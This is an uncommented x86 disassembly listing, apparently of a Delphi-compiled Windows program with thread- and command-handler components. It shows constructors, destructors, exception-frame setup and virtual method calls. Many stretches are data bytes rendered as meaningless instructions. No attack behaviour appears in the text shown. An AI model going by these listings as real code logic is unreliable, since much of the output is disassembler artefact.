mov edx ebx
and dl 0xfc
mov eax esi
call sub_4213bc
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40364c
sub_47b4ec
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_47b511
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47b518
retn
sub_47b811
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f090005 ] al
outsb
inc ebx
outsd
insd
insd
popad
outsb
sub [ fs : eax ] dl
inc eax
add [ eax ] ch
add [ eax ] al
[ eax ]
sub_47b833
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x500e0006 ] al
popad
jb r-xdata
xor [ eax ] al
add bh bh
xor [ eax ] al
add bh bh
add [ eax ] eax
add [ eax ] al
insd
inc esp
insb
imul ebp [ ebp + 0x69 ] 0x726574
adc [ eax ] al
sub [ eax ] eax
add bh bh
sub [ eax ] eax
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
pop es
add [ ebx ] cl
push eax
popad
jb r-xdata
mov ecx 0x200047
jns r-xdata
add [ eax ] cl
push edx
push eax
popad
jb r-xdata
inc eax
add [ edx + esi + 0x40 ] ah
add [ eax - 0x28 ] ch
inc edi
add [ eax + 0x40047d8 ] ch
fadd [ edi ]
push cs
add [ eax ] al
add [ eax ] al
add [ edx ] al
nop
pushfd
mov ecx 0x12070047
push esp
dec ecx
inc ebx
outsd
insd
insd
popad
outsb
dec eax
popad
outsb
insb
jb r-xdata
add [ eax ] al
cld
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + edi * 4 + 0x47 ] bl
outsd
jb r-xdata
cdq
inc ecx
add [ eax ] bh
xchg esi eax
inc ecx
add [ esi + edx * 4 + 0x54120041 ] dh
dec ecx
inc ebx
outsd
insd
insd
popad
outsb
dec eax
popad
outsb
insb
jb r-xdata
add [ eax - 0x67ffbe70 ] dl
nop
inc ecx
add [ eax + 0x3c004195 ] ah
0x9a400041 0x41
inc esp
0x99f80041 0x41
cld
outsd
outsb
jae r-xdata
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
or al [ eax ]
or [ edx + 0x65 ] dl
jae r-xdata
insd
jae r-xdata
inc edi
add [ eax + 0x600047a8 ] dl
test eax 0xa9c00047
inc edi
add ah cl
stosb [ edi ]
inc edi
add [ eax + 0x110047a6 ] bl
push esp
dec ecx
dec esp
imul esi [ ebx + 0x74 ] 0x72656e65
push esp
push 0x64616572
mov eax eax
or al 0xbb
inc edi
add [ edi ] al
adc [ ecx + ecx * 2 + 0x64 ] edx
dec esp
imul esi [ ebx + 0x74 ] 0x72656e65
push esp
push 0x64616572
mov eax 0x740047ba
cmpsb [ esi ] [ edi ]
inc edi
add [ eax ] al
add [ ebx ] cl
dec ecx
push esp
inc ebx
push eax
push ebx
jb r-xdata
jb r-xdata
add [ eax ] al
add [ eax + edx + 0x100040 ] dl
add [ eax ] al
xchg esp eax
adc [ eax ] al
and [ eax ] al
add [ eax ] al
or dl [ ecx + ecx * 2 + 0x64 ]
pop esp
mov ecx 0x658c0047
inc ecx
add [ eax ] al
add [ ebx ] cl
dec ecx
push esp
inc ebx
push eax
push ebx
jb r-xdata
inc ecx
add al ah
xor al 0x40
add ah ch
xor al 0x40
add al dh
xor al 0x40
add ah dh
xor al 0x40
add al ch
xor al 0x40
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x40 ] ah
add [ edx * 4 - 0x6f6fffbf ] dh
inc ecx
add [ eax - 0x5fffbe70 ] bl
xchg ebp eax
inc ecx
add [ edx + ebx * 4 ] bh
inc ecx
add [ eax - 0x66 ] al
inc ecx
add [ edx + ebx * 4 + 0x41 ] al
add al bh
cdq
inc ecx
add ah bh
add ah bh
popad
insb
fsub [ esi + 0x41 ]
add [ eax + eax ] dh
add bh bh
hlt
xor al [ fs : eax ]
xor al 0x95
inc ecx
cmp al 0x10
inc eax
add [ eax ] bh
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
or [ eax ] eax
or edx [ edx + 0x65 ]
jo r-xdata
adc [ eax ] al
sub al 0x0
add bh bh
sub al 0x0
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
or [ eax ] al
adc dl [ edx + 0x65 ]
jo r-xdata
pop ss
inc edx
add [ eax ] al
sbb eax [ edx ]
movsb [ edi ] [ esi ]
mov eax [ edi ]
mov ah 0x56
inc edi
add ah ch
push esi
inc edi
add [ edi + edx * 2 ] bl
jb r-xdata
add [ eax + 0x47ba ] bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah dh
mov edx 0x700047
add [ eax ] al
shl [ ebp + 0x34e00047 ] 0x1
inc eax
add [ edi + ecx + 0x34f00042 ] bh
inc eax
add ah dh
xor al 0x40
add al ch
xor al 0x40
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x40 ] ah
add [ eax ] ch
test eax 0x10700047
inc edx
add [ edi ] ah
inc edi
add [ ebp + ecx * 8 - 0x58dfffb9 ] bh
inc edi
add [ edi ] bl
inc edi
add [ edi ] dl
inc edi
add al bl
stosb [ edi ]
inc edi
add [ edx + ebp * 4 - 0x555fffb9 ] dh
inc edi
add [ eax ] ah
into
inc ebx
outsd
insd
insd
popad
outsb
lea eax [ eax ]
dec eax
mov edx 0xa070047
push esp
dec ecx
inc ebx
outsd
insd
insd
popad
outsb
adc al 0xba
inc edi
add [ ecx + edx ] al
inc eax
add [ eax ] al
add [ ebx ] cl
dec ecx
push esp
inc ebx
push eax
push ebx
jb r-xdata
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
test [ ecx + 0x200047 ] bh
add [ eax ] al
or [ ebx ] 0x0
jns r-xdata
add [ eax + r-xdata ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub [ edi + eax * 2 ] bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + edi * 4 ] cl
inc edi
add [ eax + eax - 0x7ac40000 ] bh
inc edi
add al ah
sbb al [ edx ]
in al dx
xor al 0x40
add [ esp + edx ] dh
inc edx
add ah dh
xor al 0x40
add al ch
xor al 0x40
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x40 ] ah
add [ eax - 0x6fffb874 ] cl
nop
inc ecx
add al ch
push ss
inc edx
add [ edi + ecx * 4 + 0x17c00041 ] ch
inc edx
add [ esp + edx * 4 + 0x47 ] cl
add al dl
pop ss
inc edx
add al cl
sbb [ edx ] al
clc
sbb al [ edx ]
loopne r-xdata
add [ edx + edi * 4 ] dl
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + edi * 4 ] bl
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi ] dh
mov edx 0x240047
add [ eax ] al
mov al 0x10
inc eax
add al ah
xor al 0x40
add ah ch
xor al 0x40
add al dh
xor al 0x40
add ah dh
xor al 0x40
add al ch
xor al 0x40
add [ eax + 0x32 ] cl
jae r-xdata
add [ eax ] 0x0
add [ eax + 0x5208000a ] al
js r-xdata
inc edi
add [ ecx * 4 - 0x6bebffb9 ] ah
inc edi
add [ eax ] al
mov al [ edi ]
test al 0x8a
inc edi
add [ eax - 0x63 ] ch
inc edi
add [ eax ] bh
lahf
inc edi
add [ ebx + ecx * 4 + 0x47 ] bh
add ah ch
mov [ edi ] es
pushfd
0x8d440047 0x47
int3
push edi
inc edx
add al bl
add edx [ ecx + 0x67 ]
lea eax [ eax ]
pop esp
mov ecx 0x47
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
pushfd
mov ecx 0x47
add [ eax ] al
add [ eax - 0x80000000 ] al
or eax [ eax ]
jo r-xdata
add [ eax ] al
imul ebp [ edi + 0x6e ] 0x65646f43
sub [ ecx + 0x47 ] 0x0
sub_47bc80
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al 0xbd
inc edi
add [ eax + eax ] ch
add al dl
movsd [ edi ] [ esi ]
inc edi
add al ah
xor al 0x40
add [ edi + ecx + 0x34f00042 ] bh
inc eax
add ah dh
xor al 0x40
add al ch
xor al 0x40
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x40 ] ah
add [ eax ] ch
test eax 0x10700047
inc edx
add [ edi ] ah
inc edi
add [ eax + 0x200047d0 ] dl
cmpsd [ esi ] [ edi ]
inc edi
add [ edi ] bl
inc edi
add al bl
iretd
sub_47c270
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x52130018 ] al
jo r-xdata
inc [ ecx ]
add [ eax ] al
jns r-xdata
jmp [ eax + 0x1ff0000 ]
pop eax
retn
je r-xdata
outsb
imul ebp [ esi + 0x6f ] 0x77
outsb
inc ebx
outsd
insd
insd
popad
outsb
pushad
inc esi
inc edi
add [ eax - 0x5f010000 ] ah
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sbb [ eax ] eax
or edx [ edx + 0x65 ]
jne r-xdata
hlt
jb r-xdata
push edi
popad
imul esi [ esp + edx * 2 + 0x69 ] 0xb2fc656d
inc edi
add [ ebp + ecx * 8 + 0x600047 ] al
add dh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sbb eax [ eax ]
or [ eax + ebp * 2 + 0x72 ] edx
popad
dec ebp
add [ eax ] al
add [ eax ] al
add [ eax - 0x3d ] bl
inc edi
add [ eax + eax ] cl
add [ eax ] al
dec esp
or [ edi ] eax
loopne r-xdata
push ebx
outsd
arpl [ ebx + 0x65 ] bp
je r-xdata
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0xc0047c3 ] bh
inc eax
add ah ch
xor al 0x40
add al dh
xor al 0x40
add ah dh
xor al 0x40
add al ch
xor al 0x40
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x40 ] ah
add [ eax + 0x11004032 ] ah
inc ebp
dec ecx
push esp
inc ebx
push eax
push ebx
jb r-xdata
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x5409001b ] al
push 0x64616572
dec ebp
adc [ eax ] al
movsb [ edi ] [ esi ]
add [ eax ] al
jmp [ eax + eax + 0x1ff00 ]
popad
je r-xdata
arpl [ ebp + 0x74 ] si
push ebx
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + eax * 8 ] bl
jb r-xdata
leave
mov dl 0x1
push esp
push 0x64616572
push esp
imul ebp [ ebp + 0x65 ] 0x8b74756f
rcl [ ebx + 0x56 ] 0x84
shl [ eax + ecx - 0x7d ] cl
popad
push esp
arpl [ ecx + 0x66 ] bp
imul esp [ ebp + 0x64 ] 0xc41cc08b
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov eax [ r-xdata ]
call sub_476b2c
mov [ esi + 0x7c ] eax
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_476b2c
mov [ esi + 0x94 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_418c1c
mov [ esi + 0xac ] eax
mov eax [ r-xdata ]
mov [ esi + 0xa8 ] eax
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_476b2c
mov [ esi + 0xf4 ] eax
mov [ esi + 0xa4 ] 0x1388
mov [ esi + 0x90 ] 0xf
mov eax esi
test bl bl
je r-xdata
imul ebp [ esi + 0x61 ] 0x68546574
jb r-xdata
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x40 ] ah
add [ eax + 0x15004032 ] ah
inc ebp
dec ecx
dec esi
outsd
inc ebp
js r-xdata
jb r-xdata
mov eax esi
pop esi
pop ebx
retn
call sub_403654
pop [ fs : 0x0 ]
add esp 0xc
hlt
inc edi
add [ eax + eax ] cl
add [ eax ] al
or al 0xc3
inc edi
add al ah
xor al 0x40
add ah ch
xor al 0x40
add al dh
xor al 0x40
add ah dh
xor al 0x40
add al ch
xor al 0x40
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x40 ] ah
add [ eax + 0x19004032 ] ah
inc ebp
dec ecx
push esp
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sbb al 0xc4
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ ebx + eax * 8 ] cl
inc edi
add al ah
xor al 0x40
add ah ch
xor al 0x40
add al dh
xor al 0x40
add ah dh
xor al 0x40
add al ch
xor al 0x40
sar [ eax + 0x47c3 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov eax 0xc0047c3
sub_47c310
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
pop eax
retn
sub_47c438
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4754d4
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_4762a4
mov [ esi + 0x70 ] eax
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_476ef4
mov [ esi + 0x9c ] eax
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_47d274
mov [ esi + 0x74 ] eax
mov [ esi + 0x78 ] 0x1
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_476b2c
mov [ esi + 0x7c ] eax
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_476b2c
mov [ esi + 0x94 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_418c1c
mov [ esi + 0xac ] eax
mov eax [ r-xdata ]
mov [ esi + 0xa8 ] eax
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_476b2c
mov [ esi + 0xf4 ] eax
mov [ esi + 0xa4 ] 0x1388
mov [ esi + 0x90 ] 0xf
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035fc
mov eax esi
pop esi
pop ebx
retn
call sub_403654
pop [ fs : 0x0 ]
add esp 0xc
sub_47c514
push ebx
push esi
call sub_403664
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x4c ]
cmp [ esi + 0x88 ] 0x0
je r-xdata
lea eax [ esi + 0x70 ]
call sub_40d564
lea eax [ esi + 0xf4 ]
call sub_40d564
lea eax [ esi + 0x9c ]
call sub_40d564
lea eax [ esi + 0xac ]
call sub_40d564
lea eax [ esi + 0x94 ]
call sub_40d564
lea eax [ esi + 0x7c ]
call sub_40d564
lea eax [ esi + 0x74 ]
call sub_40d564
mov edx ebx
and dl 0xfc
mov eax esi
call sub_47556c
test bl bl
jle r-xdata
cmp [ esi + 0x81 ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40364c
lea eax [ esi + 0x88 ]
call sub_40d564
sub_47c5e4
push ebx
push esi
mov esi edx
mov ebx eax
mov edx [ ebx + 0x7c ]
mov eax [ ebx + 0x9c ]
call sub_476f8c
mov edx [ ebx + 0x7c ]
mov eax [ esi + 0x68 ]
call sub_47a0c4
cmp [ ebx + 0xc2 ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0xc4 ]
call [ ebx + 0xc0 ]
sub_47c658
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_47c7b2
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x78 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xda ] 0x0
setne [ ebp - 0x9 ]
cmp [ ebp - 0x9 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x74 ]
call sub_419720
test eax eax
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47c7b9
lea eax [ ebp - 0x10 ]
call sub_4040ac
retn
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
mov eax [ ebx + 0xdc ]
call [ ebx + 0xd8 ]
mov [ ebp - 0x9 ] 0x1
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x68 ]
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
je r-xdata
push 0xffffffff
lea eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x68 ]
or ecx 0xffffffff
mov edx r-xdata
mov ebx [ eax ]
call [ ebx + 0x70 ]
mov eax [ ebp - 0x10 ]
call sub_40436c
test eax eax
jle r-xdata
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_47c5c4
xor eax eax
push ebp
push sub_47c76e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x74 ]
call sub_419720
dec eax
test eax eax
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_47c5a4
retn
inc eax
mov [ ebp - 0x14 ] eax
xor ebx ebx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x74 ]
call sub_419720
dec eax
cmp ebx eax
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x10 ]
mov eax esi
mov esi [ eax ]
call [ esi + 0x20 ]
test al al
jne r-xdata
inc ebx
dec [ ebp - 0x14 ]
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_47c7ec
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x74 ]
mov edx ebx
call sub_47d2b8
mov esi eax
cmp [ esi + 0x19 ] 0x0
je r-xdata
sub_47c7ec
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi ecx
mov ebx eax
xor eax eax
push ebp
push sub_47c878
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0xea ] 0x0
je r-xdata
mov eax [ ebx + 0xf4 ]
call sub_476e2c
test al al
je r-xdata
push esi
mov ecx edx
mov edx ebx
mov eax [ ebx + 0xec ]
call [ ebx + 0xe8 ]
jmp r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405e08
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40badc
call sub_403a64
mov edx [ ebx + 0xf4 ]
mov eax [ esi + 0x68 ]
call sub_47a0c4
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47c87f
lea eax [ ebp - 0x4 ]
call sub_4040ac
retn
sub_47c88c
push ebx
mov ebx eax
mov eax ebx
call sub_4217c0
cmp [ ebx + 0x68 ] 0x0
je r-xdata
pop ebx
retn
mov [ ebx + 0x68 ] 0x0
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x4c ]
sub_47c8ac
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
mov ecx ebx
mov edx edi
mov eax esi
call sub_42168c
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp edi [ esi + 0x6c ]
jne r-xdata
cmp edi [ esi + 0x84 ]
jne r-xdata
mov eax esi
call sub_47cc64
xor eax eax
mov [ esi + 0x6c ] eax
jmp r-xdata
cmp edi [ esi + 0x88 ]
jne r-xdata
xor eax eax
mov [ esi + 0x84 ] eax
jmp r-xdata
xor eax eax
mov [ esi + 0x88 ] eax
sub_47c900
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp - 0x4 ]
mov dl [ ebp - 0x5 ]
mov [ eax + 0x68 ] dl
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x68 ]
cmp al [ ebp - 0x5 ]
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x1
jne r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_47cbbc
xor eax eax
push ebp
push sub_47cafe
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_47cc64
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x80 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x79 ] 0x0
jne r-xdata
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xac ]
mov edx 0x1
call sub_47b1d0
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x70 ]
call sub_419720
test eax eax
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x79 ] 0x1
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x48 ]
mov eax [ ebp - 0x4 ]
add eax 0x6c
call sub_40d564
mov eax [ ebp - 0x4 ]
mov [ eax + 0x80 ] 0x0
mov eax [ ebp - 0x4 ]
call sub_47cd84
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0xa8 ]
mov [ eax + 0x34 ] edx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x88 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x70 ]
call sub_476284
mov dl 0x1
mov eax [ r-xdata ]
call sub_418c1c
mov edx [ ebp - 0x4 ]
mov [ edx + 0x8c ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x88 ]
mov edx [ eax ]
call [ edx + 0x3c ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x70 ]
call sub_419720
mov edi eax
dec edi
test edi edi
jl r-xdata
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4754d4
mov edx eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x5c ]
mov eax [ ebp - 0x4 ]
mov [ eax + 0x81 ] 0x1
inc edi
xor esi esi
mov eax [ rw-data ]
push eax
push 0x4
mov ecx 0x4
mov edx 0xffff
mov eax ebx
call sub_475cd4
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xa0 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x70 ]
mov edx esi
call sub_4762e0
mov ebx eax
xor ecx ecx
mov edx 0x1
mov eax ebx
call sub_475bb4
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xa0 ] 0x1
je r-xdata
jmp r-xdata
mov eax ebx
call sub_475d40
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x90 ]
mov eax ebx
call sub_475e7c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x70 ]
mov edx esi
call sub_4762e0
push eax
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_47cdd4
mov ebx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8c ]
mov edx ebx
call sub_418cec
mov eax ebx
mov edx [ eax ]
call [ edx + 0x2c ]
inc esi
dec edi
jne r-xdata
jmp r-xdata
sub_47cb48
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x80 ] 0x0
je r-xdata
mov [ ebx + 0x6c ] esi
test esi esi
je r-xdata
lea eax [ ebx + 0x6c ]
call sub_40d564
mov [ ebx + 0x80 ] 0x0
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
call sub_421440
sub_47cb7c
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x88 ] 0x0
je r-xdata
mov [ ebx + 0x88 ] esi
test esi esi
je r-xdata
cmp [ ebx + 0x81 ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
call sub_421440
mov [ ebx + 0x81 ] 0x0
lea eax [ ebx + 0x88 ]
call sub_40d564
sub_47cbbc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8c ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
call sub_418d74
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_47cc48
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8c ]
call sub_418dd8
retn
inc esi
xor edi edi
mov edx edi
mov eax [ ebp - 0x8 ]
call sub_4189b0
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x34 ]
mov eax [ ebx + 0x68 ]
xor edx edx
mov ecx [ eax ]
call [ ecx + 0x20 ]
mov eax ebx
call sub_4212cc
mov eax ebx
call sub_4032b0
inc edi
dec esi
jne r-xdata
sub_47cc64
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_47cd74
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xac ]
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47cd7b
lea eax [ ebp - 0x10 ]
call sub_4040ac
retn
call sub_418d74
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_47ccec
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47ccf3
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xac ]
call sub_418dd8
retn
inc ebx
xor esi esi
mov edx esi
mov eax [ ebp - 0x8 ]
call sub_4189b0
mov edi eax
mov eax [ edi + 0x68 ]
mov edx [ eax ]
call [ edx + 0x5c ]
inc esi
dec ebx
jne r-xdata
sub_47ccf3
mov [ ebp - 0x9 ] 0x1
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xa4 ]
cdq
idiv [ rw-data ]
mov ebx eax
test ebx ebx
jle r-xdata
cmp [ ebp - 0x9 ] 0x0
je r-xdata
mov eax [ rw-data ]
call sub_474ab8
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xac ]
mov edx 0x1
call sub_47b1d0
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47cd7b
lea eax [ ebp - 0x10 ]
call sub_4040ac
retn
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_405e08
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40badc
call sub_403a64
dec ebx
jne r-xdata
mov [ ebp - 0x9 ] 0x0
jmp r-xdata
sub_47cd84
push ebx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax [ ebx + 0x6c ]
pop ebx
retn
cmp [ ebx + 0x6c ] 0x0
jne r-xdata
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_47b3f0
mov edx eax
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x60 ]
mov [ ebx + 0x80 ] 0x1
sub_47cdd4
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
mov cl 0x1
xor edx edx
mov eax edi
call sub_47a890
